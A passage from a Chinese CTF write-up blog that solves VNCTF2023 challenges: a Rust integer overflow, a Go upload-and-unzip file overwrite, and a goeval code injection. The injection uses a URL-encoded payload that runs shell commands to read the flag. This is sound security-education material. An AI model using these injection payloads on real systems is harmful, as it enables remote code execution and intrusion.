src="/2024/03/20/buuctf/buu/image-20240321162508424.png" class="" title="image-20240321162508424"><p>然后把报文的body部分复制到SoapClient里面进行报文伪造</p><p>不过后面复现失败了，暂时找不到原因，先放着（伪造的脚本可以去看看<a href="https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd">官方文档</a>）</p><h2 id="VNCTF2023-电子木鱼"><a href="#VNCTF2023-电子木鱼" class="headerlink" title="[VNCTF2023]电子木鱼"></a>[VNCTF2023]电子木鱼</h2><p>这道题考的是rust整数溢出，当rust某一个数值超过它所规定的范围后，如果是在release模式下运行，程序就不会报错，而是以环绕的形式展现出结果。例如u8是指无符号数八位，范围为[0,255]，如果一个数为255，后面再加1输出，那么这个时候程序返回的就是0，就是从终到始。相应的，如果是0减1，那么返回的就是255，就是从始到终。</p><p>题目给了一个压缩包，我们重点看main.rs</p><p>拿到flag的条代码是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#[get(&quot;/&quot;)]</span><br><span class="line">async fn index(tera: web::Data&lt;Tera&gt;) -&gt; Result&lt;HttpResponse, Error&gt; &#123;</span><br><span class="line">    let mut context = Context::new();</span><br><span class="line"></span><br><span class="line">    context.insert(&quot;gongde&quot;, &amp;GONGDE.get());</span><br><span class="line"></span><br><span class="line">    if GONGDE.get() &gt; 1_000_000_000 &#123;</span><br><span class="line">        context.insert(</span><br><span class="line">            &quot;flag&quot;,</span><br><span class="line">            &amp;std::env::var(&quot;FLAG&quot;).unwrap_or_else(|_| &quot;flag&#123;test_flag&#125;&quot;.to_string()),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    match tera.render(&quot;index.html&quot;, &amp;context) &#123;</span><br><span class="line">        Ok(body) =&gt; Ok(HttpResponse::Ok().body(body)),</span><br><span class="line">        Err(err) =&gt; Err(error::ErrorInternalServerError(err)),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要功德大于1000000000才能拿到flag</p><p>观察<code>/upgrade</code>路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#[post(&quot;/upgrade&quot;)]</span><br><span class="line">async fn upgrade(body: web::Form&lt;Info&gt;) -&gt; Json&lt;APIResult&gt; &#123;</span><br><span class="line">    if GONGDE.get() &lt; 0 &#123;</span><br><span class="line">        return web::Json(APIResult &#123;</span><br><span class="line">            success: false,</span><br><span class="line">            message: &quot;功德都搞成负数了，佛祖对你很失望&quot;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if body.quantity &lt;= 0 &#123;</span><br><span class="line">        return web::Json(APIResult &#123;</span><br><span class="line">            success: false,</span><br><span class="line">            message: &quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) &#123;</span><br><span class="line">        let mut cost = payload.cost;</span><br><span class="line">        </span><br><span class="line">        if payload.name == &quot;Donate&quot; || payload.name == &quot;Cost&quot; &#123;</span><br><span class="line">            cost *= body.quantity;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if GONGDE.get() &lt; cost as i32 &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: false,</span><br><span class="line">                message: &quot;功德不足&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if cost != 0 &#123;</span><br><span class="line">            GONGDE.set(GONGDE.get() - cost as i32);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if payload.name == &quot;Cost&quot; &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: true,</span><br><span class="line">                message: &quot;小扣一手功德&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; else if payload.name == &quot;CCCCCost&quot; &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: true,</span><br><span class="line">                message: &quot;功德都快扣没了，怎么睡得着的&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; else if payload.name == &quot;Loan&quot; &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: true,</span><br><span class="line">                message: &quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; else if payload.name == &quot;Donate&quot; &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: true,</span><br><span class="line">                message: &quot;好人有好报&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; else if payload.name == &quot;Sleep&quot; &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: true,</span><br><span class="line">                message: &quot;这是什么？床，睡一下&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    web::Json(APIResult &#123;</span><br><span class="line">        success: false,</span><br><span class="line">        message: &quot;禁止开摆&quot;,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里发现当你要“Donate”或“Cost”时，cost的值会乘上你发送的quantity</p><p>在<code>PAYLOADS</code>中，有关cost的值如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const PAYLOADS: &amp;[Payload] = &amp;[</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: &quot;Cost&quot;,</span><br><span class="line">        cost: 10,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: &quot;Loan&quot;,</span><br><span class="line">        cost: -1_000,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: &quot;CCCCCost&quot;,</span><br><span class="line">        cost: 500,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: &quot;Donate&quot;,</span><br><span class="line">        cost: 1,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: &quot;Sleep&quot;,</span><br><span class="line">        cost: 0,</span><br><span class="line">    &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>根据这些信息，可以利用先求功德，后减功德来达到整数溢出的目的，这里cost已经表明范围了，是有符号的32位数</p><p>即-2147483648~2147483647</p><p>根据前面说的，只要我们功德扣的够多，就能够达到整数溢出，不然就会报功德不足</p><img src="/2024/03/20/buuctf/buu/image-20240321174221212.png" class="" title="image-20240321174221212"><p>然后扣（注意这里quantity并不是无限大，它也是需要在i32范围内的）</p><img src="/2024/03/20/buuctf/buu/image-20240321174451215.png" class="" title="image-20240321174451215"><p>得出来的这个数就是（1000-quantity*10）。这里10是指name=Cost时cost的值，payload里面有的，quantity就是你传的数了</p><p>成功造成整数溢出</p><h2 id="VNCTF2023-BabyGo"><a href="#VNCTF2023-BabyGo" class="headerlink" title="[VNCTF2023]BabyGo"></a>[VNCTF2023]BabyGo</h2><p>给了一个文件，只有<code>main.go</code>值得分析</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/cryptor&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/fileutil&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/random&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Path  <span class="type">string</span></span><br><span class="line">Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">store := cookie.NewStore(random.RandBytes(<span class="number">16</span>))</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line">r.LoadHTMLGlob(<span class="string">&quot;template/*&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">session := sessions.Default(c)</span><br><span class="line">session.Set(<span class="string">&quot;shallow&quot;</span>, userDir)</span><br><span class="line">session.Save()</span><br><span class="line">fileutil.CreateDir(userDir)</span><br><span class="line">gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">encoder := gob.NewEncoder(gobFile)</span><br><span class="line">encoder.Encode(user)</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">fileutil.CreateDir(userUploadDir)</span><br><span class="line">file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line">        <span class="comment">// 被过滤的文件</span></span><br><span class="line"><span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">filename := userUploadDir + file.Filename</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">fileutil.RemoveFile(filename)</span><br><span class="line">&#125;</span><br><span class="line">err = c.SaveUploadedFile(file, filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line">        <span class="comment">// 解压路径为/tmp/xxxxxxxxxx/uploads/path，其中path可控</span></span><br><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line"><span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">decoder := gob.NewDecoder(file)</span><br><span class="line"><span class="keyword">var</span> ctfer User</span><br><span class="line">decoder.Decode(&amp;ctfer)</span><br><span class="line"><span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))<span class="comment">// 这里pkg也可控，只不过默认值是fmt，可能需要我们去覆盖调用fmt的内容</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析重点在<code>/upload</code>，<code>/unzip</code>和<code>/backdoor</code>。由于上传文件的类型中不能有<code>.go</code>和<code>.gob</code>，加上有个解压功能，因此可以考虑将恶意代码写入一个go文件后进行压缩，然后再解压到任意路径下，最后获得backdoor的权限实现getshell</p><p>==（path可控是因为c.Query(“path”)相当于$_GET[“path”]）==</p><h3 id="backdoor的权限获取"><a href="#backdoor的权限获取" class="headerlink" title="backdoor的权限获取"></a>backdoor的权限获取</h3><p>分析<code>/backdoor</code>，发现需要user.gob来进行提权，那就可以考虑能不能覆盖。</p><p>注意到<code>/upload</code>中会删除之前存在的同名文件，然后上传新文件，可以利用这点进行覆盖</p><p>大致思路清楚了，我们直接上手</p><p>怎么生成文件的代码已经给我们了，直接照搬照抄就行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Path  <span class="type">string</span></span><br><span class="line">Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    gobfile, _ := os.Create(<span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: <span class="string">&quot;/tmp/c641fceaxxxxxx/&quot;</span>, Power: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">encoder := gob.NewEncoder(gobfile)</span><br><span class="line">encoder.Encode(user)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到user.gob</p><p>压缩后上传并进行解压</p><img src="/2024/03/20/buuctf/buu/image-20240322124104887.png" class="" title="image-20240322124104887"><p>去<code>/backdoor</code>看看有没有覆盖成功</p><img src="/2024/03/20/buuctf/buu/image-20240322152548101.png" class="" title="image-20240322152548101"><p>成功覆盖</p><h3 id="go沙盒逃逸"><a href="#go沙盒逃逸" class="headerlink" title="go沙盒逃逸"></a>go沙盒逃逸</h3><p>这里先不具体说，目前只需要知道这题目的漏洞点在<code>eval, err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))</code>就可以了。</p><p>在go中，系统执行的第一个函数一般是<code>main()</code>，但是<code>init()</code>是个例外，它能在<code>main()</code>之前调用</p><p>根据这个，我们就可以写脚本了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// cmd := exec.Command(&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;whoami&quot;)</span></span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat /f*&quot;</span>)</span><br><span class="line">res, err := cmd.CombinedOutput()</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">fmt.Println(<span class="type">string</span>(res))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">Message = <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>但是我们需要的是<code>import (</code>后面的一部分，goeval的源码<a href="https://github.com/PaulXu-cn/goeval/blob/main/eval.go">在这里</a>，可以想想为什么</p><p>:::info</p><p>实际上在源码的<code>func main()</code>中，传入的包是以依次拼接的形式构成的，而在开始时importStr就已经被定义成了<code>import (</code>了，传入的数据会依次拼接在它后面。所以我们只需要注意怎么闭合符号即可</p><p>:::</p><p>提一句，最后一部分加const也是为了闭合后面的”)，然后将其稍微修改一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os/exec&quot;%0A&quot;fmt&quot;)%0Afunc%09init()%7B%0Acmd:=exec.Command(&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;cat$&#123;IFS&#125;/f*&quot;)%0Ares,err:=cmd.CombinedOutput()%0Afmt.Println(err)%0Afmt.Println(res)%0A&#125;%0Aconst(%0AMessage=&quot;fmt</span><br></pre></td></tr></table></figure><img src="/2024/03/20/buuctf/buu/image-20240322163156511.png" class="" title="image-20240322163156511"><p>python脚本将ascii码转换为chr即可</p><h2 id="VNCTF2023-象棋王子"><a href="#VNCTF2023-象棋王子" class="headerlink" title="[VNCTF2023]象棋王子"></a>[VNCTF2023]象棋王子</h2><p>签到难度的jsfuck，找到对应代码后放到控制台print就行</p><img 